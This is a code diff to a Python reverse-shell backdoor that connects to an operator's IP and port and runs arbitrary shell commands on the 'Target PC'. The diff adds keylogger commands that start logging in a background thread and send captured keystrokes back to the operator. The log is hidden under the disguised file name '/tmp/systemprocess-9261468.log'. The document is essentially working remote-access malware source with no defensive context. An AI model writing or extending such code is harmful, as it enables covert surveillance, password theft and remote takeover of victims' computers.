@@ -38,16 +38,20 @@ def screenshot():
         screenshot.shot()
 
 def shell():
+    global path
+
     while True:
         command = reliable_recv()
         if command == 'q':
-            break
+            sys.exit()
         elif command == "help":
             help_options = '''                    download [path] --> Download A file From Target PC
                     upload [path]   --> Upload A File to Target PC
                     get [url]       --> Download A File To Target PC from any link
                     start [path]    --> Run A Program on Target PC
                     screenshot      --> Take A Screenshot of Target Screen
+                    keylog_start    --> Start The Keylogger
+                    keylog_dump     --> Dump The Keystrokes from Keylogger
                     q               --> Exit The Reverse Shell '''
             reliable_send(help_options)
         elif command[:2] == "cd" and len(command) > 1:
@@ -82,8 +86,13 @@ def shell():
                 reliable_send("[+] Program Started")
             except:
                 reliable_send("[!!] Failed To Start")
-        elif command == "keylog_start":
-
+        elif command[:12] == "keylog_start":
+            t1 = threading.Thread(target=keylogger.start)
+            t1.start()
+        elif command[:11] == "keylog_dump":
+            fn = open(keylogger_path, "r")
+            reliable_send(fn.read())
+            pass
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
@@ -112,6 +121,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 ip = sys.argv[1]
 port = int(sys.argv[2])
+keylogger_path = "/tmp/systemprocess-9261468.log"
 
 connection()
 sock.close()
